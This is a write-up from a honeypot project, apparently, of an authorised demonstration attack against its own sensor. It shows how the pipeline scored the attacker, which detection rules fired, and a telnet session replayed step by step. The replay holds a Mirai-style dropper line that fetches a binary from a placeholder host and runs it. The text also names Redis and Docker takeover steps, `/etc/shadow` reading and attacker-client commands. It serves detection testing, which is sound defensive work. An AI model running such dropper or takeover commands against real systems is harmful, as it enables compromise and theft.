# Demonstration — a full kill chain, end to end

A controlled, authorised walkthrough: a single simulated operator runs a
five-stage attack against the live Azure sensor, and the pipeline captures,
detects, scores, maps and replays it. This is a **demonstration of capability**,
not a record of an intrusion — the traffic originates from the operator's own
address (`136.158.56.92`), which is excluded from all genuine-attacker figures
elsewhere in this repo and is dropped at admission during normal operation.

- **Target:** the production sensor at `104.214.170.247` (public ports)
- **Attacker:** the version-controlled client in [`attacker/`](../attacker/) for
  SSH/telnet, plus hand-issued Redis and Docker requests for the newer bait
- **Date:** 2026-08-17 08:08–08:14 UTC
- **Nothing was executed on the host.** Every shell is emulated; every
  attacker-supplied URL is recorded, never fetched.

---

## The scenario

A cloud crypto-mining crew sweeps an IPv4 address, works whatever it finds, and
tries to land a miner. One coherent operator, five stages, five services.

| # | Stage | Service | What the operator did |
|--:|---|---|---|
| 1 | Recon | HTTP | Probed `/.env`, `/.git/config`, `/phpmyadmin`; fired Log4Shell, Shellshock and SQLi |
| 2 | Credential attack | SSH | List-driven credential stuffing against port 22 |
| 3 | IoT loader | Telnet | Mirai default-credential login, then the busybox/wget dropper |
| 4 | Datastore RCE | Redis | `CONFIG SET dir` + SSH-key `SET` + `SAVE` + `SLAVEOF` |
| 5 | Daemon takeover | Docker | Enumerated the API, then a privileged host-mount miner container |

The sensor kept every stage progressing — it served convincing `200`s for
`/.env` and `/.git/config`, granted a telnet shell, answered the Redis and Docker
commands with plausible replies — so the operator ran its whole playbook and the
sensor recorded all of it.

---

## What the pipeline made of it

### One source, scored

```
source:         136.158.56.92  (Philippines, ComClark Network & Technology Corp)
threat score:   100 / 100
classification: botnet-loader
services hit:   docker, http, redis, ssh, telnet
tags:           scanner:nuclei, scanner:zgrab, tool:curl, command-injection,
                env-file-probe, log4shell, path-traversal, shellshock,
                sql-injection, webshell-upload, iot-botnet
```

The score is transparent — every point traces to a component:

| Component | Points | From |
|---|--:|---|
| post-exploitation | 30.0 | shell obtained, dropper run, Docker exec |
| severity | 25.0 | multiple critical alerts |
| volume | 15.0 | request count |
| persistence | 12.0 | repeated sessions over time |
| credential breadth | 11.3 | many distinct username/password pairs |
| service breadth | 8.0 | five services touched |
| threat intel | 6.0 | source/UA matched local feeds |

### Sixteen detection rules, from one IP

| Rule | Severity | ATT&CK |
|---|---|---|
| Interactive shell obtained | critical | T1078 |
| IoT default credentials used | critical | T1078.001 |
| Mirai-family command signature | critical | T1059.004 |
| Second-stage payload fetch | critical | T1105 |
| Log4Shell (JNDI) exploitation attempt | critical | T1190 |
| Shellshock exploitation attempt | critical | T1190 |
| Webshell upload attempt | critical | T1505.003 |
| Redis RCE / persistence attempt | critical | T1059, T1053.003 |
| Docker host filesystem mount attempt | critical | T1610, T1611 |
| Docker container start or exec | critical | T1610 |
| Docker cryptominer image | critical | T1496 |
| Redis dangerous command | high | T1059 |
| SQL injection attempt | high | T1190 |
| Exposed secret file probe | high | T1552.001 |
| Docker API enumeration | medium | T1046 |
| Multi-service sweep | medium | T1046 |

### The telnet loader, replayed keystroke by keystroke

The highest-value read in the system: the exact sequence, at the pace it
happened, straight from `GET /api/sessions/{id}`.

```
session 2b419523 · telnet · PH · 11 events

  +0.0s  connect
  +0.3s  login  admin / 1234
  +0.0s  ** shell granted **
  +0.2s  $ /bin/busybox ECCHI
  +0.2s  $ cat /proc/mounts
  +0.2s  $ cat /bin/echo
  +0.2s  $ /bin/busybox wget http://198.51.100.77/bins/mirai.arm7 -O /tmp/.x
  +0.2s  $ chmod +x /tmp/.x
  +0.2s  $ /tmp/.x telnet.mirai
  +0.2s  $ rm -rf /tmp/.x
  +0.0s  disconnect
```

That `wget` URL was **recorded, never fetched** — it appears in the daily digest
defanged to `hxxp://198[.]51[.]100[.]77/bins/mirai[.]arm7`.

---

## The point

One authorised operator exercised five services, and without any manual triage
the platform produced a scored, classified adversary; sixteen deduplicated,
MITRE-mapped alerts; and a replayable transcript of exactly what was typed. That
is the whole product — capture, enrichment, detection, scoring, and replay —
demonstrated end to end against the live sensor in six minutes.

**Reproduce it** (against your own honeypot only):

```bash
python -m attacker.run --target <your-host> --port 22 --scenario credential_stuffing --i-operate-this-target
python -m attacker.run --target <your-host> --port 23 --scenario iot_botnet_mimic     --i-operate-this-target
# Redis and Docker stages: see the raw requests in this document's git history
```

The sensor's ignore-list drops the operator address at admission during normal
operation, so this demonstration traffic never enters the genuine-attacker
dataset. See [`azure-run-2026-08-17.md`](azure-run-2026-08-17.md) for that
separation and the production figures.

---

## Wave 2 — closing the coverage gaps (2026-08-19)

A second, targeted campaign aimed at the four techniques the rule set claimed
but had never actually fired — turning `rule-only` cells into evidenced ones.

| Technique | Attack sent | Result |
|---|---|---|
| T1110.003 Password spraying | one password across 16 distinct usernames (telnet) | **fired** |
| T1110.004 Credential stuffing | 16 distinct usernames in one window | **fired** |
| T1003.008 `/etc/shadow` dumping | `cat /etc/shadow` in a granted shell | **fired** |
| T1090 Proxy (FTP bounce) | `PORT` to a third-party host | verified by test — see below |

**ATT&CK coverage moved from 17/21 (81%) to 20/21 (95%)** in one wave.

### The FTP-bounce finding

The bounce attempt would not deliver over the wire from the operator host: every
`PORT` command carrying a foreign address was reset before it reached the sensor.
The cause is **the attacker's own operating system** — the Windows FTP
Application-Layer Gateway inspects the control channel and tears down a `PORT`
that advertises a mismatched IP, exactly the classic bounce. It is a real, if
ironic, artifact: the attack was blocked by the attacker's own stack, not the
target.

The `ftp_bounce` rule and the FTP service's `PORT` handling were therefore proven
the deterministic way instead — a unit test drives the exact event the service
emits (`tags: [ftp-bounce-attempt]`) through the shipped rule and asserts the
alert, mapped to T1090. See `tests/unit/test_detection.py::TestShippedMatchRules`.
This is stronger evidence than a lucky session: it holds every run.

### Also fixed this wave

- **JSONL export route.** `GET /api/export/events.jsonl` now exists — the
  exporter shipped from day one but was reachable only from the CLI. Covered by
  a regression test so the gap can't reopen.
- Test suite: **256 passing.**
